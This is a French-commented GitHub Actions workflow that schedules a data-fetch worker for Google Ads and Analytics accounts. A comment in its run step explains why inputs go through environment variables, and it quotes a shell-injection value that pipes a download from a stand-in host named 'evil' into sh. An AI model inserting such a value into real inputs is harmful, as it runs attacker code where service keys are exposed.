name: Fetch automatique des données

# Tourne chaque jour à 07:00 UTC. Le worker ne traite que les utilisateurs
# dont c'est le jour de mise à jour (profiles.fetch_schedule) — défaut : lundi.
on:
  schedule:
    - cron: "0 7 * * *"
  workflow_dispatch:        # permet de lancer à la main depuis l'onglet Actions
    inputs:
      mode:
        description: "mise_a_jour (le cron : reprise + recouvrement) ou complete (tout l'historique d'UN compte, EXIGE user_id)"
        type: choice
        options: [mise_a_jour, complete]
        default: mise_a_jour
      force:
        description: "mise_a_jour : ignorer le jour planifié (tous les users)"
        type: boolean
        default: false
      user_id:
        description: "Ne traiter que cet utilisateur (récolte d'amorçage de Pulse, ou rejeu à la main)"
        type: string
        default: ""
      report_only:
        description: "mise_a_jour : republie juste le rapport depuis les données en base"
        type: boolean
        default: false
      depuis:
        description: "complete : date de départ AAAA-MM-JJ (vide = 37 mois, la limite de Meta)"
        type: string
        default: ""

# L'ESSAI N'EST PAS UN MODE DE CE WORKFLOW, et c'est voulu (ticket 07 de
# `.scratch/recolte/`). Il écrit un JSON de données client : sur le runner,
# le fichier meurt avec la machine, et le publier en artefact l'exposerait à
# quiconque lit ce dépôt PUBLIC. L'essai se lance en local
# (`python3.12 saas/collecte/essai.py`), où le JSON reste chez David.

# UNE RÉCOLTE À LA FOIS PAR COMPTE. Tant que le seul départ manuel était le
# bouton « ↻ Mes données », personne ne pouvait en lancer deux coup sur coup.
# Depuis que brancher une source déclenche sa récolte
# (`saas/web/app/comptes/actions.ts`), choisir son compte Google Ads puis sa
# propriété Analytics en fait partir DEUX à quelques secondes d'intervalle :
# deux workers sur le même compte écriraient `fetch_progress` en même temps et
# publieraient le rapport deux fois. Elles s'attendent donc, par compte — la
# clé vide regroupe les passages du cron, qui ne tourne qu'une fois par jour.
# `cancel-in-progress: false` : on ne coupe jamais une récolte en cours, elle
# peut être à sa quinzième minute d'Instagram.
concurrency:
  group: recolte-${{ inputs.user_id }}
  cancel-in-progress: false

jobs:
  fetch:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"

      - name: Install deps
        run: pip install -r requirements.txt

      - name: Run fetch worker
        env:
          SUPABASE_URL: ${{ secrets.SUPABASE_URL }}
          SUPABASE_SERVICE_KEY: ${{ secrets.SUPABASE_SERVICE_KEY }}
          GOOGLE_ADS_CLIENT_ID: ${{ secrets.GOOGLE_ADS_CLIENT_ID }}
          GOOGLE_ADS_CLIENT_SECRET: ${{ secrets.GOOGLE_ADS_CLIENT_SECRET }}
          GOOGLE_ADS_DEVELOPER_TOKEN: ${{ secrets.GOOGLE_ADS_DEVELOPER_TOKEN }}
          GOOGLE_ADS_LOGIN_CUSTOMER_ID: ${{ secrets.GOOGLE_ADS_LOGIN_CUSTOMER_ID }}
          # Optionnel : email hebdo via Resend (sans clé → dry-run, aucun envoi)
          RESEND_API_KEY: ${{ secrets.RESEND_API_KEY }}
          EMAIL_FROM: ${{ secrets.EMAIL_FROM }}
          # TOUTES LES ENTRÉES PASSENT PAR L'ENVIRONNEMENT, aucune n'est
          # interpolée en `${{ }}` dans le script. Une entrée de
          # workflow_dispatch est du texte libre : collée telle quelle dans le
          # shell, `x"; curl evil | sh; #` s'exécuterait sur le runner, où
          # vivent SUPABASE_SERVICE_KEY et RESEND_API_KEY. Les
          # booléens sont comparés à la chaîne "true", jamais exécutés.
          MODE: ${{ inputs.mode }}
          DEPUIS: ${{ inputs.depuis }}
          USER_ID: ${{ inputs.user_id }}
          REPORT_ONLY: ${{ inputs.report_only }}
          FORCE: ${{ inputs.force }}
        run: |
          M=saas/collecte/mise_a_jour.py
          if [ "$MODE" = "complete" ]; then
            # La récolte complète EXIGE un compte : le script le refuse
            # lui-même sans `--user`, et c'est volontaire — forcer le passage de
            # TOUS les comptes un jour qui n'est celui de personne leur
            # enverrait à tous l'email hebdo (publish_weekly_report envoie dès
            # qu'il a une adresse, sans contrôle de jour). Un rejeu vise un compte.
            if [ -n "$DEPUIS" ]; then
              python saas/collecte/recolte_complete.py --user "$USER_ID" --depuis "$DEPUIS"
            else
              python saas/collecte/recolte_complete.py --user "$USER_ID"
            fi
          elif [ "$REPORT_ONLY" = "true" ] && [ -n "$USER_ID" ]; then
            python "$M" --report-only "$USER_ID"
          elif [ -n "$USER_ID" ]; then
            python "$M" --user "$USER_ID"
          elif [ "$FORCE" = "true" ]; then
            python "$M" --force
          else
            python "$M"
          fi
